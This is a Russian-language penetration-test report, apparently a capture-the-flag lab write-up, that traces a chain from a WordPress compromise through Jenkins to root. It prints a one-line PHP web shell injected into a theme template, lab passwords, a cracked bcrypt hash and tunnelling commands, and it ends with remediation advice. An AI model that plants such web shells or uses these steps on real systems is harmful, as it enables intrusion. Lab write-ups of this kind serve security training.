# Отчет о проведении тестирования на проникновение

**Клиент:** Internal Environment  
**Тип тестирования:** Black Box (внешнее, веб-приложение, внутренняя сеть)  
**Сроки:** За 3 недели до релиза в производство  
**Цель:** Получение доступа к флагам `user.txt` и `root.txt` как доказательство успешной эксплуатации


## 1. Исполнительное резюме

В ходе тестирования на проникновение была проведена полная цепочка атаки от внешнего периметра до полной компрометации внутренней инфраструктуры. Исходный вектор — веб-приложение WordPress с уязвимостями конфигурации и слабыми учетными данными. Злоумышленник (в роли которого выступал тестировщик) смог получить первоначальный доступ к веб-серверу, затем обнаружил внутренний сервис Jenkins, изолированный в Docker-контейнере, и в конечном итоге получил доступ к хост-системе под учетной записью `root`.

**Критичность:** Критическая. Полная компрометация инфраструктуры, включая доступ к конфиденциальным данным и возможность дальнейшего развития атаки.


## 2. Методология

Тестирование проводилось в соответствии с методологией PTES (Penetration Testing Execution Standard) и включало следующие этапы:

1.  **Сбор информации (Reconnaissance):** Сканирование портов, фаззинг директорий, идентификация сервисов.
2.  **Анализ уязвимостей (Vulnerability Assessment):** Поиск слабых мест в веб-приложении, конфигурациях и версиях ПО.
3.  **Эксплуатация (Exploitation):** Получение первоначального доступа, повышение привилегий, горизонтальное перемещение.
4.  **Пост-эксплуатация (Post-Exploitation):** Сбор доказательств, поиск флагов, анализ возможности дальнейшего закрепления.


## 3. Детальный ход тестирования

### 3.1. Разведка и сканирование

Первоначальное сканирование выявило два открытых порта на целевом хосте:

- **22/tcp** — OpenSSH 7.6p1 (Ubuntu)
- **80/tcp** — Apache httpd 2.4.29 (Ubuntu)

На порту 80 располагалась стандартная заглушка Apache. В соответствии с рекомендациями клиента, в файл `/etc/hosts` было добавлено соответствие `internal.thm` целевому IP-адресу.

### 3.2. Фаззинг веб-приложения

Фаззинг директорий выявил следующие интересные ресурсы:

- `/blog` — WordPress 5.4.2
- `/phpmyadmin` — интерфейс управления базами данных

Дальнейшее исследование `/blog` с помощью WPScan выявило плагин Akismet с известной уязвимостью (CVE-2015-9357), однако эксплуатация не потребовалась.

### 3.3. Компрометация WordPress

В ходе анализа блога был обнаружен пользователь `admin`. Первоначальный брутфорс пароля не дал результатов, однако при более тщательном подходе (с использованием словаря `rockyou.txt` и учета контекста) был подобран пароль: `my2boys`.

С использованием учетных данных `admin:my2boys` была выполнена авторизация в административной панели WordPress. Через редактор тем (Theme Editor) в шаблон страницы 404 был внедрен веб-шелл:

```php
<?=`$_GET[cmd]`?>
```

Это позволило получить удаленное выполнение команд (RCE) от имени пользователя `www-data`.

### 3.4. Сбор учетных данных

С полученным доступом были извлечены конфигурационные файлы:

- **WordPress (`wp-config.php`):**
  - `DB_USER: wordpress`
  - `DB_PASSWORD: wordpress123`
- **phpMyAdmin (`config-db.php`):**
  - `$dbuser: phpmyadmin`
  - `$dbpass: B2Ud4fEOZmVq`

В базе данных MySQL не было обнаружено дополнительных учетных данных, кроме хеша администратора WordPress.

### 3.5. Обнаружение внутренних сервисов и горизонтальное перемещение

В файловой системе был найден файл `/opt/wp-save.txt` с учетными данными:

```
aubreanna:bubb13guM!@#123
```

С использованием этих данных был выполнен вход по SSH под пользователем `aubreanna`, что позволило получить первый флаг (`user.txt`) и обнаружить файл `jenkins.txt` со следующим содержимым:

```
Internal Jenkins service is running on 172.17.0.2:8080
```

Для удобства дальнейшей работы был настроен SSH-туннель:

```bash
ssh -L 8081:127.0.0.1:8080 aubreanna@internal.thm -i id_rsa_aub -N
```

### 3.6. Исследование Jenkins

На порту 8080 (внутри контейнера) был обнаружен сервис Jenkins. Попытка входа с учетными данными `aubreanna` и паролем `bubb13guM!@#123` не увенчалась успехом. Также были найдены другие учетные данные (`william:arnold147`), которые также не подошли.

В файловой системе Jenkins был найден хеш пароля пользователя `admin`:

```
#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe
```

Попытка использования инструмента `jenkins-credentials-decryptor` с файлами `master.key`, `hudson.util.Secret` и `config.xml` не дала результата (вероятно, из-за несовпадения версий или поврежденных файлов). Однако хеш был успешно взломан с помощью `hashcat` (режим 3200, словарь `rockyou.txt`):

- **Пароль:** `spongebob`

С учетными данными `admin:spongebob` была выполнена авторизация в Jenkins.

### 3.7. Эксплуатация Jenkins и получение доступа к контейнеру

Через Script Console Jenkins был выполнен скрипт для получения обратного шелла:


Получен шелл от имени пользователя `jenkins` (uid=1000) внутри Docker-контейнера. Было подтверждено наличие файла `.dockerenv`, что указывает на нахождение в изолированной среде.

### 3.8. Повышение привилегий и выход на хост

Анализ показал, что контейнер работает на ядре `4.15.0-112-generic`, уязвимом к ряду локальных повышений привилегий. Однако эксплуатация CVE-2018-18955 (неверная обработка namespaces) не увенчалась успехом.

В ходе исследования файловой системы контейнера был обнаружен файл `/opt/note.txt` со следующим содержимым:

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you need access to the root user account.

root:tr0ub13guM!@#123
```

С использованием этих учетных данных был выполнен вход по SSH на хост-систему под пользователем `root`, что позволило получить финальный флаг (`root.txt`).


## 4. Найденные уязвимости

| № | Уязвимость | Критичность | Описание |
|---|------------|-------------|----------|
| 1 | Слабые учетные данные WordPress | Высокая | Пароль `my2boys` подобран брутфорсом. |
| 2 | RCE через редактор тем WordPress | Критическая | Возможность внедрения PHP-кода в шаблоны. |
| 3 | Хранение учетных данных в открытом виде | Высокая | Файлы `wp-save.txt`, `note.txt` содержат пароли. |
| 4 | Слабый пароль Jenkins | Высокая | Хеш `spongebob` взломан. |
| 5 | Изолированный, но доступный Jenkins | Средняя | Jenkins доступен из контейнера, но не защищен от компрометации. |
| 6 | Уязвимое ядро (4.15.0-112) | Средняя | Потенциальная возможность LPE, но не эксплуатирована. |


## 5. Рекомендации по устранению

1.  **Учетные данные:**
    - Использовать сложные пароли (минимум 12 символов, буквы, цифры, спецсимволы).
    - Внедрить многофакторную аутентификацию (MFA) для всех административных интерфейсов.
    - Никогда не хранить пароли в открытом виде в файлах. Использовать менеджеры секретов (HashiCorp Vault, AWS Secrets Manager).
2.  **WordPress:**
    - Обновить WordPress и все плагины до последних версий.
    - Отключить редактор тем и плагинов в production-среде (`define('DISALLOW_FILE_EDIT', true);`).
    - Ограничить доступ к `/wp-admin` по IP.
3.  **Jenkins:**
    - Изолировать Jenkins в отдельной сети, недоступной из контейнеров.
    - Использовать сложные пароли и MFA.
    - Регулярно обновлять Jenkins и плагины.
4.  **Инфраструктура:**
    - Обновить ядро до актуальной версии.
    - Провести аудит прав доступа и конфигураций Docker.
    - Регулярно проводить сканирование уязвимостей и пентесты.


## 6. Заключение

Тестирование продемонстрировало возможность полной компрометации инфраструктуры клиента. Цепочка атак включала компрометацию WordPress, горизонтальное перемещение к Jenkins, эксплуатацию Script Console и выход на хост-систему под root. Основные причины успеха — слабые пароли, хранение учетных данных в открытом виде и недостаточная изоляция сервисов.
